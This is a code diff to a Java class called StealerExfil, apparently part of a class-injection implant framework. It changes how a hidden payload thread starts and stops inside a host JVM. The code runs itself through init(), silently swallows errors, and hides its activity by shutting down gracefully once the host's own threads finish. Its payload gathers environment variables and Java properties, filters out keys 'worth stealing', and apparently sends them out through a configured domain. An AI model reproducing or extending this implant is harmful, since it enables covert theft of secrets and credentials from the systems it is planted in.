@@ -13,8 +13,9 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
     public static final String URL_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789";
     private static final int MAX_SEQNO_LEN = 5;
 
+    // Config properties from ClassImplant template:
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
-    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
+    static volatile boolean CONF_GRACEFUL_SHUTDOWN = true;
     static volatile int CONF_DELAY_MS = 0;
 
     /**
@@ -57,19 +58,29 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
      */
     static volatile int CONF_FQDN_MAX_LEN = 253;
 
+    // From ClassImplant template:
     @SuppressWarnings("unused")
     public static void init() {
         if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
             if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
-                StealerExfil implant = new StealerExfil();
-                Thread background = new Thread(implant);
-                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
-                background.setUncaughtExceptionHandler(implant);
-                background.start();
+                // Run the payload in a separate thread:
+                ClassImplant implant = new ClassImplant();
+                Thread payloadThread = new Thread(implant);
+                payloadThread.setDaemon(!CONF_GRACEFUL_SHUTDOWN);
+                payloadThread.setUncaughtExceptionHandler(implant);
+                payloadThread.start();
+
+                if (CONF_GRACEFUL_SHUTDOWN) {
+                    // Run a lookout thread that waits for all other (non-daemon) threads in the JVM to finish:
+                    Thread lookoutThread = new Thread(() -> waitForOtherThreads(payloadThread));
+                    lookoutThread.setUncaughtExceptionHandler(implant);
+                    lookoutThread.start();
+                }
             }
         }
     }
 
+    // From ClassImplant template:
     @Override
     public void run() {
         if (CONF_DELAY_MS > 0) {
@@ -82,11 +93,62 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
         payload(System.getenv(), System.getProperties());
     }
 
+    // From ClassImplant template:
+    private static void waitForOtherThreads(Thread payloadThread) {
+        while (!Thread.interrupted()) {
+            // Inspect threads currently running in this JVM:
+            boolean foundAnyOtherThreadAlive = false;
+            for (Thread thread : Thread.getAllStackTraces().keySet()) {
+                if (thread.equals(payloadThread)) {
+                    continue;
+                }
+                if (thread.equals(Thread.currentThread())) {
+                    continue;
+                }
+                if (thread.isDaemon()) {
+                    continue;
+                }
+                if (thread.getName().equals("DestroyJavaVM") || thread.getStackTrace().length == 0) {
+                    /*
+                     * When the main thread is finished, a special thread "DestroyJavaVM" may pop up.
+                     * This is and indicator that the main thread is done, but that does not mean all (legit) threads
+                     * are done yet. Ignore this thread and continue the search.
+                     */
+                    continue;
+                }
+                if (thread.isAlive()) {
+                    foundAnyOtherThreadAlive = true;
+                    break;
+                }
+            }
+
+            if (!foundAnyOtherThreadAlive) {
+                payloadThread.interrupt();
+                break;
+            }
+
+            // Wait for a while and check again...
+            try {
+                //noinspection BusyWait because we can't put latches and stuff in all arbitrary threads we're waiting for.
+                Thread.sleep(500);
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+            }
+        }
+    }
+
+    // From ClassImplant template:
     @Override
     public void uncaughtException(Thread thread, Throwable throwable) {
         // Silently ignore (don't throw up error messages on stderr)
     }
 
+    /**
+     * This is the StealerExfil-specific payload code.
+     *
+     * @param envVars   environment variables
+     * @param javaProps java runtime properties
+     */
     void payload(Map<String, String> envVars, Properties javaProps) {
         if (CONF_DOMAIN == null || CONF_DOMAIN.isEmpty()) {
             return;
@@ -124,13 +186,14 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
 
     /**
      * Convert Properties object to Map<String, String> type.
+     *
      * @param prop java.util Properties object.
      * @return Map of key value pair strings.
      */
     static Map<String, String> propToMap(Properties prop) {
         Map<String, String> map = new HashMap<>();
 
-        for (Enumeration<?> e = prop.propertyNames(); e.hasMoreElements();) {
+        for (Enumeration<?> e = prop.propertyNames(); e.hasMoreElements(); ) {
             String key = (String) e.nextElement();
             String value = prop.getProperty(key); // Safely get value as String
             map.put(key, value);
@@ -141,8 +204,9 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
 
     /**
      * Map Key matcher returns whatever is worth stealing in a Map of <String, String>.
+     *
      * @param map Map of Key value pair properties to match
-     * @return      Matching properties as Map of Strings
+     * @return Matching properties as Map of Strings
      */
     static Map<String, String> getMatcingKeys(Map<String, String> map, String interesting) {
         Pattern pattern = Pattern.compile(interesting, Pattern.CASE_INSENSITIVE);
